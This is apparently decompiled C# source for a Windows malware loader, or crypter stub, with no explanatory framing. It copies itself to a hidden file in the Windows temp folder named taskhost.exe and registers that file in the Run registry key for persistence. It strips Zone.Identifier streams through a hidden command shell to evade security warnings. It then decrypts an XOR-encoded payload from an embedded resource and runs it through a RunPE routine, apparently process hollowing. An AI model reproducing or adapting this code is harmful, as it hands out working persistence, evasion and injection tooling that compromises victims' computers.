using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace smss;

[StandardModule]
internal sealed class ReadResource
{
	private static object _tPath = Environment.GetEnvironmentVariable("windir") + "\\temp\\taskhost.exe";

	private static object _proc = Process.GetCurrentProcess().MainModule!.ModuleName;

	public static void Startup()
	{
		try
		{
			if (!File.Exists(Conversions.ToString(_tPath)))
			{
				File.Copy(Conversions.ToString(_proc), Conversions.ToString(_tPath), overwrite: true);
			}
			File.SetAttributes(Conversions.ToString(_tPath), File.GetAttributes(Conversions.ToString(_tPath)) | FileAttributes.Hidden);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey != null && registryKey.GetValue(Conversions.ToString(_tPath)) == null)
			{
				registryKey.SetValue(Conversions.ToString(_tPath), RuntimeHelpers.GetObjectValue(_tPath));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void DisableSecurity()
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			ProcessStartInfo processStartInfo2 = processStartInfo;
			processStartInfo2.FileName = "cmd";
			processStartInfo2.RedirectStandardInput = true;
			processStartInfo2.RedirectStandardOutput = true;
			processStartInfo2.UseShellExecute = false;
			processStartInfo2.CreateNoWindow = true;
			processStartInfo2 = null;
			process.StartInfo = processStartInfo;
			process.Start();
			using StreamReader streamReader = process.StandardOutput;
			using (StreamWriter streamWriter = process.StandardInput)
			{
				streamWriter.WriteLine(Conversions.ToString(Operators.ConcatenateObject((object)"cd ", _tPath)), (object)(AppWinStyle)0);
				streamWriter.WriteLine(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"FOR /R %I IN (*", _proc), (object)"*) DO > %I:Zone.Identifier ECHO.")), (object)(AppWinStyle)0);
				streamWriter.WriteLine("exit");
				streamWriter.Close();
			}
			streamReader.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadResource(IntPtr hModule, IntPtr fr);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SizeofResource(IntPtr hModule, IntPtr fr);

	[STAThread]
	public static void Main()
	{
		DisableSecurity();
		Startup();
		try
		{
			string moduleName = Process.GetCurrentProcess().MainModule!.ModuleName;
			IntPtr moduleHandleA = GetModuleHandleA(ref moduleName);
			IntPtr fr = FindResource(moduleHandleA, "0", "RT_RCDATA");
			IntPtr source = LoadResource(moduleHandleA, fr);
			int num = SizeofResource(moduleHandleA, fr);
			byte[] array = new byte[num - 1 + 1 - 1 + 1];
			Marshal.Copy(source, array, 0, num);
			int seed = BitConverter.ToInt32(array, Convert.ToInt32(array.Length - 4));
			array = (byte[])Utils.CopyArray((Array)array, (Array)new byte[array.Length - 3 + 1 - 1 + 1]);
			Random random = new Random(seed);
			byte[] array2 = new byte[array.Length - 1 + 1 - 1 + 1];
			random.NextBytes(array2);
			int num2 = Convert.ToInt32(array.Length - 1);
			for (int i = 0; i <= num2; i++)
			{
				array[i] = Convert.ToByte((byte)(array[i] ^ array2[i]));
			}
			RunpeClass.RunpeSub(array, Conversions.ToString(_proc));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
